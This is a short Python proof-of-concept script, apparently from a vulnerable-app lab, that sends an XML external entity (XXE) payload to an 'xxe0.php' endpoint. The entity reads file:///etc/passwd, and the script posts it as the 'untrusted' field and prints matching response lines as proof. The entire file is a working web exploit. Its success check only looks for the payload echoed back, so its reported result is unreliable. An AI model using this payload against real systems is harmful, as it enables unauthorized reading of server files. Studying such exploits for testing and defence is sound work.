#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests

from consts import *

target += "xxe0.php"
payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>"""

def main ():
    print("[*] Sending `{}` on target".format(payload))
    r = requests.post(target, data={"untrusted": payload})
    if payload in r.text:
        print("[*] Payload executed successfully")
        print("[*] PoC:")

        for line in r.text.split('\n'):
            if payload in line:
                print(line)
    else:
        print("[*] Attack failed")

if __name__ == '__main__':
    main()